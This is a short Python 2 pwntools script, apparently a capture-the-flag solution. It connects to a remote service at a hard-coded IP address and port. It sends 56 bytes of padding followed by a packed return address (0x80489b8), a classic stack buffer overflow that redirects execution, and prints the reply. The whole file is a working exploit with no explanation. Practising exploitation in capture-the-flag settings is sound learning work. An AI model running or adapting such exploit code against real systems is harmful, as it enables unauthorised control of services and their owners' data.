#!/usr/bin/python

from pwn import *

r = remote("54.175.35.248", 8005)

buff   = 'a'*56
buff += p32(0x80489b8)

r.sendline(buff)
print r.recv()

